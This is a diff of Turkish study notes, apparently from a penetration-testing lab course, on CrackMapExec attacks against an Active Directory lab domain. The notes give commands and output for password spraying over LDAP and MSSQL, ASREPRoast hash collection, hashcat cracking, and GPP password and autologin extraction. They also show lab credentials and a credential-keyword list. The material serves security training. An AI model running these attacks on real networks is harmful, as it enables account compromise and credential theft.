+### FQDN'nin hosts dosyasına eklenmesi ve Password Spray İşleminin Gerçekleştirilmesi
 
-![Pasted image 20241201201515.png](/img/user/resimler/Pasted%20image%2020241201201515.png)
+```
+cat /etc/hosts | grep inlanefreight
+10.129.203.121 inlanefreight.htb dc01.inlanefreight.htb
+```
 
-![Pasted image 20241201201522.png](/img/user/resimler/Pasted%20image%2020241201201522.png)
+```
+crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p
+Inlanefreight01!
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 445 DC01 [-]
+inlanefreight.htb\julio:Inlanefreight01!
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01
+```
 
 
-### Kimlik Doğrulama Mekanizmaları
-MSSQL, SSH veya FTP gibi bazı Windows servisleri, kendi kullanıcı veritabanlarını işleyecek veya Windows ile entegre olacak şekilde yapılandırılabilir. Bu durumda, hizmet tarafından kullanılan local veritabanına, Active Directory kullanıcılarına veya hizmetin kurulu olduğu bilgisayarın local kullanıcılarına karşı Parola Püskürtmeyi deneyebiliriz. Farklı kimlik doğrulama mekanizmaları aracılığıyla bir MSSQL Sunucusuna karşı nasıl Parola Püskürtme gerçekleştirebileceğimizi görelim.
+### Authentication (Kimlik Doğrulama) Mekanizmaları
+
+MSSQL, SSH veya FTP gibi bazı Windows servisleri, kendi kullanıcı veritabanlarını işleyecek veya Windows ile entegre olacak şekilde yapılandırılabilir. Bu durumda, servis tarafından kullanılan local veritabanına, Active Directory kullanıcılarına veya servisin kurulu olduğu bilgisayarın local kullanıcılarına karşı Password Spray deneyebiliriz. Farklı kimlik doğrulama mekanizmaları aracılığıyla bir MSSQL Sunucusuna karşı nasıl Passowrd Spray gerçekleştirebileceğimizi görelim.
 
 
 ### MSSQL - Password Spray
-Microsoft SQL Server (MSSQL), verileri tablolarda, sütunlarda ve satırlarda saklayan ilişkisel bir veritabanı yönetim sistemidir. Veritabanları hostları, kullanıcı kimlik bilgileri, Kişisel Tanımlanabilir Bilgiler (PII), işle ilgili veriler ve ödeme bilgileri dahil ancak bunlarla sınırlı olmamak üzere her türlü hassas verinin depolanmasından sorumlu oldukları için yüksek hedef olarak kabul edilirler.
+
+Microsoft SQL Server (MSSQL), verileri tablolarda, sütunlarda ve satırlarda saklayan ilişkisel bir veritabanı yönetim sistemidir. Veritabanları hostları, kullanıcı kimlik bilgileri, Personal Identifiable Information (PII), işle ilgili veriler ve ödeme bilgileri dahil ancak bunlarla sınırlı olmamak üzere her türlü hassas verinin depolanmasından sorumlu oldukları için yüksek hedef olarak kabul edilirler.
 
 
 ### MSSQL Authentication Mechanisms
-MSSQL iki kimlik doğrulama modunu destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:
-![Pasted image 20241201202156.png](/img/user/resimler/Pasted%20image%2020241201202156.png)
 
-Bu, MSSQL'de kimlik doğrulaması yapmak için üç tür kullanıcıya sahip olabileceğimiz anlamına gelir:
-4. Active Directory Account. 
-5. Local Windows Account. 
-6. SQL Account.
+MSSQL iki [authentication modunu](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:
+
+| **Authentication Type**         | **Description**                                                                                                                                                                                                                                                                                                                                                                    |
+| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Windows authentication mode** | Bu, varsayılan olan ve genellikle entegre güvenlik olarak adlandırılan moddur, çünkü SQL Server güvenlik modeli Windows/Active Directory ile sıkı bir şekilde entegre edilmiştir. Belirli Windows kullanıcıları ve grup hesapları SQL Server'a giriş yapmaya yetkilidir. Zaten kimlik doğrulaması yapılmış Windows kullanıcılarının, ek kimlik bilgileri sunmalarına gerek yoktur. |
+| **Mixed mode**                  | Mixed mode, Windows/Active Directory hesapları ve SQL Server kimlik doğrulamasını destekler. Kullanıcı adı ve şifre çiftleri SQL Server içinde saklanır.                                                                                                                                                                                                                           |
+
+Bu, `MSSQL`'de kimlik doğrulaması yapmak için üç tür kullanıcıya sahip olabileceğimiz anlamına gelir:
+
+1. Active Directory Account. 
+2. Local Windows Account. 
+3. SQL Account.
 
 Bir Active Directory hesabı için domain adını belirtmemiz gerekir:
 
 ### Password Spray - Active Directory Account
-![Pasted image 20241201202520.png](/img/user/resimler/Pasted%20image%2020241201202520.png)
 
-Lokal bir Windows Hesabı için, domain seçeneği -d veya hedef makine adı olarak bir nokta (.) belirtmemiz gerekir:
+```
+crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+MSSQL 10.129.203.121 1433 DC01 [-]
+ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
+untrusted domain and cannot be used with Integrated authentication.
+MSSQL 10.129.203.121 1433 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+
+```
+
+Lokal bir Windows Hesabı için, domain seçeneği `-d` veya hedef makine adı olarak bir nokta (`.`) belirtmemiz gerekir:
 
 ### Password Spray - Local Windows Account
 
-![Pasted image 20241201203121.png](/img/user/resimler/Pasted%20image%2020241201203121.png)
-![Pasted image 20241201203129.png](/img/user/resimler/Pasted%20image%2020241201203129.png)
+```
+crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
+
+MSSQL 10.129.203.121 1433 None [*] None
+(name:10.129.203.121) (domain:.)
+MSSQL 10.129.203.121 1433 None [-]
+ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
+untrusted domain and cannot be used with Integrated authentication.
+MSSQL 10.129.203.121 1433 None [+]
+.\grace:Inlanefreight01!
+
+```
 
 Not: Bu bir Domain Controller olduğundan, Windows local hesapları kullanılmamıştır. Bu örnek, local windows hesapları ile Domain Controller olmayan bir makine hedeflendiğinde geçerli olacaktır.
 
-Genellikle yöneticiler, local kullanım veya test için Active Directory hesaplarıyla aynı isimde hesaplar oluşturabilirler. Active Directory hesabı ile aynı ad ve parola ile oluşturulmuş MSSQL hesapları bulabiliriz. Parolanın yeniden kullanımı çok yaygındır! Bir SQL Hesabı denemek istiyorsak, --local-auth bayrağını belirtmemiz gerekir:
+Genellikle administrators, local kullanım veya test için Active Directory hesaplarıyla aynı isimde hesaplar oluşturabilirler. Active Directory hesabı ile aynı ad ve parola ile oluşturulmuş MSSQL hesapları bulabiliriz. Parolanın yeniden kullanımı çok yaygındır! Bir SQL Hesabı denemek istiyorsak, `--local-auth` bayrağını belirtmemiz gerekir:
 
 
 ### Password Spray - SQL Account
-![Pasted image 20241201203435.png](/img/user/resimler/Pasted%20image%2020241201203435.png)
+
+```
+crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! --
+local-auth
+
+MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:DC01)
+MSSQL 10.129.203.121 1433 DC01 [-]
+ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'julio'.
+MSSQL 10.129.203.121 1433 DC01 [+]
+grace:Inlanefreight01!
+```
 
 Gördüğümüz gibi, grace hesabı aynı parola ile MSSQL veritabanında local olarak mevcuttur.
 
-
 ### Other Protocols
-Bazen bir kullanıcının yönetici olmayabileceğini, ancak RDP, SSH, FTP gibi diğer protokollere erişim ayrıcalıklarına sahip olabileceğini unutmayın. Parola Püskürtme gerçekleştirirken hedefi anlamak ve mümkün olduğunca çok protokole saldırmaya çalışmak çok önemlidir.
 
-Not: Active Directory kimlik doğrulamasını kullanarak Parola Spreyi yaptığımızda, başarısız parola denemelerinin sayısı tüm protokoller için aynı olacaktır. Örneğin, kilitleme sınırı beş deneme ise ve RDP kullanarak üç parola ve WinRM'ye karşı iki parola denersek, sayı 5'e ulaşacak ve hesabın kilitlenmesine neden olacağız.
+Unutmayın ki, bazen bir kullanıcı administrator olmayabilir, ancak RDP, SSH, FTP gibi diğer protokollere erişim yetkisine sahip olabilir. Bu, Password Spraying yaparken hedefi anlamanın ve olabildiğince çok protokole saldırı yapmanın önemli olduğu bir durumdur.
+
+Not: Active Directory kimlik doğrulaması kullanarak Password Spray yaparken, başarısız şifre deneme sayısı tüm protokoller için aynı olacaktır. Örneğin, eğer kilitlenme sınırı beş deneme ise ve biz üç şifreyi RDP üzerinden, iki şifreyi ise WinRM karşısında denersek, toplamda 5'e ulaşılacak ve hesabın kilitlenmesine sebep olacağız.
 
 
 ### Next Steps
-Bu bölümde, geçerli kimlik bilgilerini belirlemeye ve domain'e erişim sağlamaya çalışmak için bir kullanıcı listesi kullanarak farklı protokollere karşı Password Spraying'in nasıl gerçekleştirileceğini öğrendik. Bir sonraki bölümde, brute forcing veya Parola Püskürtme olmadan hesapları tanımlamak için diğer mekanizmalar tartışılacaktır.
+
+Bu bölümde, geçerli kimlik bilgilerini belirlemeye ve domain'e erişim sağlamaya çalışmak için bir kullanıcı listesi kullanarak farklı protokollere karşı Password Spraying'in nasıl gerçekleştirileceğini öğrendik. Bir sonraki bölümde, `brute forcing` veya `Password` `Spray` olmadan hesapları tanımlamak için diğer mekanizmalar tartışılacaktır.
 
 
 ### Finding ASREPRoastable Accounts
-ASREPRoast saldırısı, Kerberos ön kimlik doğrulaması gerekmeyen kullanıcıları arar. Bu, herhangi birinin bu kullanıcılardan herhangi biri adına KDC'ye bir AS_REQ isteği gönderebileceği ve bir AS_REP mesajı alabileceği anlamına gelir. Bu son mesaj türü, şifresinden türetilen orijinal kullanıcı anahtarı ile şifrelenmiş bir veri yığını içerir. Daha sonra, bu mesaj kullanılarak, kullanıcı nispeten zayıf bir parola seçtiyse, kullanıcı parolası çevrimdışı olarak kırılabilir. Bu saldırı hakkında daha fazla bilgi edinmek için Active Directory Numaralandırmaları ve Saldırıları modülüne göz atın.
 
-Domain üzerinde bir hesabımız yoksa ancak bir kullanıcı adı listemiz varsa, belki şansımız yaver gider ve Kerberos ön kimlik doğrulaması gerektirmeyen seçeneğe sahip bir hesap bulabiliriz. Bu seçenek ayarlanmışsa, kullanıcının şifresiyle çözülebilen şifrelenmiş verileri bulmamızı sağlar.
+ASREPRoast saldırısı, Kerberos `pre-authentication (ön kimlik doğrulaması)` gerekmeyen kullanıcıları arar. Bu, herhangi birinin bu kullanıcılardan herhangi biri adına KDC'ye bir `AS_REQ` isteği gönderebileceği ve bir `AS_REP` mesajı alabileceği anlamına gelir. Bu son tür mesaj, şifresinden türetilen orijinal `user anahtarıyla` şifrelenmiş bir veri parçası içerir. Daha sonra, bu mesaj kullanılarak, kullanıcı nispeten zayıf bir parola seçtiyse, kullanıcı parolası `çevrimdışı` olarak kırılabilir. 
 
-Daha önce -- asreproast seçeneği ile bulduğumuz kullanıcı listesi ile LDAP protokolünü kullanabilir ve ardından bir dosya adı ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldırıya karşı savunmasız en az bir hesap olup olmadığını belirlemek için users.txt dosyasının içindeki her hesabı arayacağız:
+Domain üzerinde bir hesabımız yoksa ancak bir kullanıcı adı listemiz varsa, belki şansımız yaver gider ve Kerberos pre-authentication gerektirmeyen seçeneğe sahip bir hesap bulabiliriz. Bu seçenek ayarlanmışsa, kullanıcının şifresiyle çözülebilen şifrelenmiş verileri bulmamızı sağlar.
+
+Daha önce `--asreproast` seçeneği ile bulduğumuz kullanıcı listesi ile LDAP protokolünü kullanabilir ve ardından bir dosya adı ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldırıya karşı savunmasız en az bir hesap olup olmadığını belirlemek için `users.txt` dosyasının içindeki her hesabı arayacağız:
 
 ### ASREPRoast için Bruteforcing Hesapları
-![Pasted image 20241201204417.png](/img/user/resimler/Pasted%20image%2020241201204417.png)
 
-Listemize dayanarak, ASREPRoasting'e karşı savunmasız bir hesap bulduk. Geçerli kimlik bilgilerimiz varsa Kerberos ön kimlik doğrulaması gerektirmeyen tüm hesapları talep edebiliriz. ASREPRoast'a karşı savunmasız tüm hesapları istemek için Grace'in kimlik bilgilerini kullanalım.
+```
+crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast
+asreproast.out
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 445 DC01 [email
+protected]:1674ae058d5280dbc25ee678ee938c71$7277ce57387d449dd80c5e9d9a9b94
+0a91e1f720e506ce910d7b48ad9faa97d10e32dc265101ad14b097e5755108278a4f32bb62
+3d716478a600c5301e03db8e97165b0d0229155cef2a34d40f57841c0a7a1a0d0fed693b23
+1e81940d70f127d20af8e6a1e813d663484c3073ed8ba8f2e117f15f8def6ebda88fc45baf
+59a6fbee01d87dce18051b9159e38a2869a5fdffa0ccffde4ac5ae45a75f978ac958f0d23b
+2e36fa05cbfe13f38ca7ea4311e859d85b1c29e4ce226c72c09e25127a96a18f7afc8d2c73
+67a2dc14d61954b9e63812f5787e3ce5e2dc403674549e0bb18e76f758b4c04ad46ff34945
+9fcb777b78d50fb876
+```
+
+Listemize dayanarak, ASREPRoasting'e karşı savunmasız bir hesap bulduk. `Geçerli kimlik bilgilerimiz varsa`  Kerberos pre-authentication gerektirmeyen tüm hesapları talep edebiliriz. ASREPRoast'a karşı savunmasız tüm hesapları istemek için Grace'in kimlik bilgilerini kullanalım.
 
 
 ### Search for ASREPRoast Accounts
-![Pasted image 20241201204658.png](/img/user/resimler/Pasted%20image%2020241201204658.png)
 
-Tüm hash'leri aldıktan sonra, 18200 modülü ile Hashcat'i kullanabilir ve bunları kırmayı deneyebiliriz. rockyou.txt kelime listesini kullanalım ve bu hash'leri kırmaya çalışalım:
+```
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --
+asreproast asreproast.out
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
+records returned 6
+LDAP dc01.inlanefreight.htb 389 DC01 [email
+protected]:5567a4d9df8894497ce50c74c15cbe74$ea2eeece92c1314848071449c4061f
+1c8e0153a5e91deaec56a1009b33aa4aa8fd86f9a17d8012629ee31aa525eeb98c1a9fc873
+f1db27935f79d6fe8a9edc43116afcfdc161d1f90e48baf5d25691f418254ffe9e68c9ff36
+ded80b81e165a61fc3867202fcd0e5279d45509024e728e792a1dede3deedb522028d4c76d
+b8f7f819775136c350727d83f00cc9ddddcb1df1813cc7a4c299352af22d61a746bb84c6c9
+de8e501ed35e630a424fb560349d827b23658081c1bab64e7a208eab6af974d972ad8f445f
+b3cbb55a0d294429a5be20472e92963c4ebd7e39ad49cd47661d6d3b7045a3200454b6deb6
+e88fcdac3d0a81326c
+LDAP dc01.inlanefreight.htb 389 DC01 [email
+protected]:be96a4ea9e79a3f21c2984fc8b75d1f6$34c5bd1641d4588248348b6b91713d
+45f60f37c5153369101af2b4294906c729a516fdea8c474f5e470d4d465bfa5d43dbbfe8e4
+5cc1f1d12b0802796af3dd629f5be07282c9024be029ffb1c6243f0139a943b89952833a7a
+7794ac77372dc107fbd14cd6ebe084a6c3123651d75ddd46a7406d68a8711e8e11257cfdda
+71e0c13c8f5a9852afb0a0b9e3acc8856655987d3725f495e15ee56fb94f10df0a247d04ef
+967b252000782b8debb410cb7a4f60a2704b3aa8a3ed3d444d2b6d2e96bb93086bb64407a1
+cd4b240cb41955b446753795e2855f54d11d49360a5998df52a9a92f761477e66fc01972cb
+46b818a680c7f97854
+```
+
+Tüm hash'leri aldıktan sonra, `18200` modülü ile `Hashcat`'i kullanabilir ve bunları kırmayı deneyebiliriz. `rockyou.txt` kelime listesini kullanalım ve bu hash'leri kırmaya çalışalım:
 
 
 ### Password Cracking
-![Pasted image 20241201204805.png](/img/user/resimler/Pasted%20image%2020241201204805.png)
-![Pasted image 20241201204816.png](/img/user/resimler/Pasted%20image%2020241201204816.png)
+
+```
+hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+<SNIP>
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344386
+* Bytes.....: 139921355
+* Keyspace..: 14344386
+[email
+protected]:40d78fb0fd99b5070f8e519670e72f01$728671cd74bfb9b009f4e4dc7b5206
+e4f45c3497b1e097fb47d9ddcee8211928d857cd8d11e6c7b9e4ced73806974a8db226c3cf
+b14962cab03f7c6d85c5670ecbcf513d99d28f1e6445de81c7ee3c29641eb633457ed7b53d
+40deba514a2e06d08759111628afd9b91a683622b6fed872d85f6a2e083237d4bb8d3ac43d
+dd4fb7198389969bcc6282066fd34fcf06945806679e5eccc215a7034ac88bb2f2f068a4fb
+176bcc3a48396cdf152614ec8a634bac8745e18e23d135afef234def28c53a74e930c315c8
+666de1d63165317c7454460af3bf711a5c3006f498d2a1ee532cf537b97a991a2dc71d6de9
+5ae8ca64c2c7cd8301:Password!
+<SNIP>
+```
+
 Domain üzerinde geçerli bir hesap bulmanın başka bir yolunu bulduk, bu da ortam hakkında çok daha fazla bilgi toplamamızı ve belki de hosts veya diğer kullanıcıları tehlikeye atmaya başlamamızı sağlayacaktı
 
+----
 
-### Group Policy Nesnelerinde Hesapları Arama
-Bir hesabın kontrolünü ele geçirdiğimizde, gerçekleştirmemiz gereken bazı zorunlu kontroller vardır. Group Policy Objects'de (GPO) yazılı kimlik bilgilerini aramak, özellikle eski bir ortamda (Windows server 2003 / 2008) işe yarayabilir, çünkü her domain kullanıcısı GPO'ları okuyabilir.
+### Group Policy Objelerinde Hesapları Arama
 
-CrackMapExec, tüm GPO'ları arayacak ve ilginç kimlik bilgilerini bulacak iki modüle sahiptir. gpp_password ve gpp_autologin modüllerini kullanabiliriz. İlk modül olan gpp_password, Grup İlkesi Tercihleri (GPP) aracılığıyla gönderilen hesaplar için düz metin parolasını ve diğer bilgileri alır. Bu saldırı hakkında daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazısında okuyabilirsiniz. İkinci modül olan gpp_autologin, autologin bilgilerini bulmak için Domain Controller'daki registry.xml dosyalarını arar ve varsa kullanıcı adını ve açık metin parolasını döndürür.
+Bir hesabın kontrolünü ele geçirdiğimizde, gerçekleştirmemiz gereken bazı zorunlu kontroller vardır. `Group Policy Objects'de (GPO)` yazılı kimlik bilgilerini aramak, özellikle eski bir ortamda (Windows server 2003 / 2008) işe yarayabilir, çünkü her domain kullanıcısı `GPO`'ları okuyabilir.
 
+CrackMapExec, tüm GPO'ları arayacak ve ilginç kimlik bilgilerini bulacak iki modüle sahiptir. `gpp_password` ve `gpp_autologin` modüllerini kullanabiliriz. İlk modül olan gpp_password, `Group Policy Preferences (GPP)` aracılığıyla gönderilen hesaplar için düz metin parolasını ve diğer bilgileri alır. Bu saldırı hakkında daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazısında okuyabilirsiniz. İkinci modül olan `gpp_autologin`, `autologin` bilgilerini bulmak için Domain Controller'daki `registry.xml` dosyalarını arar ve varsa kullanıcı adını ve açık metin parolasını döndürür.
 
 ### Password GPP
-![Pasted image 20241202011439.png](/img/user/resimler/Pasted%20image%2020241202011439.png)
+
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
+gpp_password
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+GPP_PASS... 10.129.203.121 445 DC01 [+] Found SYSVOL share
+GPP_PASS... 10.129.203.121 445 DC01 [*] Searching for
+potential XML files containing passwords
+GPP_PASS... 10.129.203.121 445 DC01 [*] Found
+inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+GPP_PASS... 10.129.203.121 445 DC01 [+] Found credentials
+in inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+GPP_PASS... 10.129.203.121 445 DC01 Password:
+Inlanefreight1998!
+GPP_PASS... 10.129.203.121 445 DC01 action: U
+GPP_PASS... 10.129.203.121 445 DC01 newName:
+GPP_PASS... 10.129.203.121 445 DC01 fullName:
+GPP_PASS... 10.129.203.121 445 DC01 description:
+GPP_PASS... 10.129.203.121 445 DC01 changeLogon: 0
+GPP_PASS... 10.129.203.121 445 DC01 noChange: 1
+GPP_PASS... 10.129.203.121 445 DC01 neverExpires: 1
+GPP_PASS... 10.129.203.121 445 DC01 acctDisabled: 0
+GPP_PASS... 10.129.203.121 445 DC01 userName:
+inlanefreight.htb\engels
+```
 
 
 ### AutoLogin GPP
 
-![Pasted image 20241202011609.png](/img/user/resimler/Pasted%20image%2020241202011609.png)
-![Pasted image 20241202011617.png](/img/user/resimler/Pasted%20image%2020241202011617.png)
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
+gpp_autologin
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+GPP_AUTO... 10.129.203.121 445 DC01 [+] Found SYSVOL share
+GPP_AUTO... 10.129.203.121 445 DC01 [*] Searching for
+Registry.xml
+GPP_AUTO... 10.129.203.121 445 DC01 [*] Found
+inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
+ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 10.129.203.121 445 DC01 [+] Found credentials
+in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
+ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 10.129.203.121 445 DC01 Usernames: ['kiosko']
+GPP_AUTO... 10.129.203.121 445 DC01 Domains:
+['INLANEFREIGHT']
+GPP_AUTO... 10.129.203.121 445 DC01 Passwords:
+['SimplePassword123!']
+```
 
 Bizim durumumuzda, iki farklı parolaya sahip iki hesap bulduk. Bu hesapların hala geçerli olup olmadığını kontrol edelim:
 
-
 ### Credentials Validation
-![Pasted image 20241202011952.png](/img/user/resimler/Pasted%20image%2020241202011952.png)
-![Pasted image 20241202011958.png](/img/user/resimler/Pasted%20image%2020241202011958.png)
+
+```
+crackmapexec smb 10.129.203.121 -u engels -p Inlanefreight1998! SMB 
+
+10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\engels:Inlanefreight1998!
+```
+
+```
+crackmapexec smb 10.129.203.121 -u kiosko -p SimplePassword123! SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\kiosko:SimplePassword123!
+```
 
 Her iki hesap da hala geçerlidir ve bunları domain'de kimlik doğrulaması yapmak için kullanabilir, hangi ayrıcalıklara sahip olduklarını belirleyebilir veya bu kimlik bilgilerini yeniden kullanmayı deneyebiliriz
 
 Bu bölüm bize kimlik bilgilerini elde etmek için GPO yapılandırmalarını kötüye kullanmanın birkaç yöntemini öğretti. Bir sonraki bölümde, kimliği doğrulanmış bir kullanıcı olarak daha fazla bilgi toplamanın yollarını tartışmaya devam edeceğiz
 
-
 ### Modüllerle Çalışma
-Daha önce tartıştığımız gibi, her CrackMapExec protokolü modülleri destekler. Belirtilen protokol için mevcut modülleri görüntülemek için crackmapexec protocol -L komutunu çalıştırabiliriz. Örnek olarak LDAP protokolünü kullanalım.
+
+Daha önce tartıştığımız gibi, her CrackMapExec protokolü modülleri destekler. Belirtilen protokol için mevcut modülleri görüntülemek için `crackmapexec protocol -L` komutunu çalıştırabiliriz. Örnek olarak LDAP protokolünü kullanalım.
 
 ### LDAP için Mevcut Modülleri Görüntüle
 
-![Pasted image 20241202012602.png](/img/user/resimler/Pasted%20image%2020241202012602.png)
+```
+crackmapexec ldap -L
 
-User-desc modülünü seçelim ve modüllerle nasıl etkileşime girebileceğimizi görelim
+[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
+[*] adcs Find PKI Enrollment Services in Active
+Directory and Certificate Templates Names
+[*] daclread Read and backup the Discretionary Access
+Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
+carefull, this module cannot read the DACLS recursively, more explains in
+the options.
+[*] get-desc-users Get description of the users. May contained
+password
+[*] get-network
+[*] laps Retrieves the LAPS passwords
+[*] ldap-checker Checks whether LDAP signing and binding are
+required and / or enforced
+[*] ldap-signing Check whether LDAP signing is required
+[*] subnets Retrieves the different Sites and Subnets of
+an Active Directory
+[*] user-desc Get user descriptions stored in Active
+Directory
+[*] whoami Get details of provided user
+```
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir. Hedef IP'yi FQDN dc01.inlanefreight.htb olarak yapılandırın.
+`User-desc` modülünü seçelim ve modüllerle nasıl etkileşime girebileceğimizi görelim
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir. Hedef IP'yi FQDN `dc01.inlanefreight.htb` olarak yapılandırın.
 
 
-### Modüllerdeki Seçenekleri Belirleme
-Bir CrackMapExec modülü, bazı özel değerleri ayarlamak için farklı seçeneklere sahip olabilir. MAQ gibi herhangi bir seçeneği olmayan modüller olabilir, bu da varsayılan eylemini değiştiremeyeceğimiz anlamına gelir. Bir modülün desteklenen seçeneklerini görüntülemek için aşağıdaki sözdizimini kullanabiliriz: ==crackmapexec protocol -M module_name --options==
+### Modüllerde Seçeneklerin Tanımlanması
+
+Bir CrackMapExec modülü, bazı özel değerler ayarlamak için farklı seçeneklere sahip olabilir. MAQ gibi seçeneklere sahip olmayan modüller olabilir, bu da varsayılan eylemlerini değiştiremeyeceğimiz anlamına gelir. Bir modülün desteklenen seçeneklerini görüntülemek için aşağıdaki sözdizimini kullanabiliriz:  
+`crackmapexec <protokol> -M <modül_adı> --options`
 
 
 ### LDAP MAQ Modülü için Seçenekleri Görüntüle
-![Pasted image 20241202014810.png](/img/user/resimler/Pasted%20image%2020241202014810.png)
 
+```
+crackmapexec ldap -M MAQ --options
+[*] MAQ module options:
+None
+```
 
 ### LDAP user-desc Modülü için Seçenekleri Görüntüle
-![Pasted image 20241202020137.png](/img/user/resimler/Pasted%20image%2020241202020137.png)
-LDAP modülü user-desc, Active Directory domainindeki tüm kullanıcıları sorgular ve açıklamalarını alır, yalnızca varsayılan anahtar kelimelerle eşleşen kullanıcı açıklamalarını görüntüler, ancak tüm açıklamaları bir dosyaya kaydeder.
 
-Varsayılan anahtar kelimeler açıklamada belirtilmemiştir. Bu anahtar kelimelerin ne olduğunu bilmek istiyorsak, kaynak koduna bakmamız gerekir. Kaynak kodunu CrackMapExec/cme/modules/ dizininde bulabiliriz. Daha sonra modül adını arayabilir ve açabiliriz. Bizim durumumuzda, user-desc modülünü içeren Python betiği user_description.py'dir. Anahtar kelimeleri bulmak için dosyayı grepleyelim :
+```
+crackmapexec ldap -M user-desc --options
+[*] user-desc module options:
+ LDAP_FILTER Custom LDAP search filter (fully replaces the
+default search)
+ DESC_FILTER An additional seach filter for descriptions
+(supports wildcard *)
+ DESC_INVERT An additional seach filter for descriptions (shows
+non matching)
+ USER_FILTER An additional seach filter for usernames (supports
+wildcard *)
+ USER_INVERT An additional seach filter for usernames (shows
+non matching)
+ KEYWORDS Use a custom set of keywords (comma separated)
+ ADD_KEYWORDS Add additional keywords to the default set (comma
+separated)
+
+```
+
+LDAP modülü olan **`user-desc`**, Active Directory domainindeki tüm kullanıcıları sorgular ve açıklamalarını alır. Varsayılan anahtar kelimelerle eşleşen kullanıcı açıklamalarını yalnızca görüntüler, ancak tüm açıklamaları bir dosyaya kaydeder.
+
+Varsayılan anahtar kelimeler açıklamada sağlanmaz. Bu anahtar kelimelerin ne olduğunu öğrenmek istiyorsak, kaynak koda bakmamız gerekir. Kaynak kodunu **`CrackMapExec/cme/modules/`** dizininde bulabiliriz. Ardından modül adını arayabilir ve açabiliriz. Bizim durumumuzda, **`user-desc`** modülünü içeren Python script'i **`user_description.py`**'dir. Dosyayı **grep** komutuyla arayarak **keywords** kelimesini bulalım:
 
 
 ### user-desc Modülünün Kaynak Koduna Bakmak
-![Pasted image 20241202020312.png](/img/user/resimler/Pasted%20image%2020241202020312.png)
+
+```
+cat CrackMapExec/cme/modules/user_description.py |grep keywords
+ KEYWORDS Use a custom set of keywords (comma separated)
+ ADD_KEYWORDS Add additional keywords to the default set (comma
+separated)
+ self.keywords = {'pass', 'creds', 'creden', 'key', 'secret',
+'default'}
+ ...SNIP...
+```
+
 
